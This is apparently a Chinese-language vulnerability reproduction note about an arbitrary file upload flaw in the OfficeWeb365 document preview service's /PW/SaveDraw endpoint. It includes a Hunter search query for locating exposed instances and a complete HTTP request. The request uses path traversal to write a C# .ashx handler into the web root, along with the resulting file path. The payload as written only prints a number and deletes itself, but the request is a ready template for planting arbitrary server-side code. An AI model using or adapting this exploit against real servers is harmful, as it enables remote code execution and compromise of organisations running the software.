# OfficeWeb365 SaveDraw存在任意文件上传漏洞

# 一、漏洞简介
OfficeWeb365是西安大西信息科技有限公司开发的，专注于Office文档在线预览及PDF文档在线预览云服务，包括Microsoft Word文档在线预览、Excel表格在线预览、Powerpoint演示文档在线预览，WPS文字处理、WPS表格、WPS演示及Adobe PDF文档在线预览。广泛应用于OA办公系统、招聘网站、在线教育类网站，提高客户体验、增加产品竞争力。OfficeWeb365 /PW/SaveDraw存在任意文件上传漏洞。

# 二、影响版本
+ OfficeWeb365

# 三、资产测绘
+ hunter：`app.name="OfficeWeb365"`

![1692028029052-65569f24-4578-4a92-a007-d93c1b5b8f94.png](./img/SE9ISR0qOEH1QGWX/1692028029052-65569f24-4578-4a92-a007-d93c1b5b8f94-882686.png)

+ 登录页面

![1692028081742-18ce6201-05b3-4e01-a21c-4eca8dcf2636.png](./img/SE9ISR0qOEH1QGWX/1692028081742-18ce6201-05b3-4e01-a21c-4eca8dcf2636-273911.png)

# 四、漏洞复现
```plain
POST /PW/SaveDraw?path=../../Content/img&idx=11.ashx HTTP/1.1
Host: xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
Content-Type: application/x-www-form-urlencoded

data:image/png;base64,<%@ Language="C#" Class="Handler1" %>public class Handler1:System.Web.IHttpHandler
{
public void ProcessRequest(System.Web.HttpContext context)
{
System.Web.HttpResponse response = context.Response;
response.Write(44 * 41);

string filePath = context.Server.MapPath("/") + context.Request.Path;
if (System.IO.File.Exists(filePath))
{
    System.IO.File.Delete(filePath);
}
}
public bool IsReusable
{
get { return false; }
}
}///---
```

![1701180007393-aa52d3f6-1378-4a67-be24-c41634aa5bbd.png](./img/SE9ISR0qOEH1QGWX/1701180007393-aa52d3f6-1378-4a67-be24-c41634aa5bbd-536589.png)

上传文件位置

```plain
/Content/img/UserDraw/drawPW11.ashx
```

![1701180072351-7554664d-c81e-48a1-b618-1218a79a505e.png](./img/SE9ISR0qOEH1QGWX/1701180072351-7554664d-c81e-48a1-b618-1218a79a505e-918752.png)



> 更新: 2024-02-29 23:55:51  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ws6vxp637qoycw2u>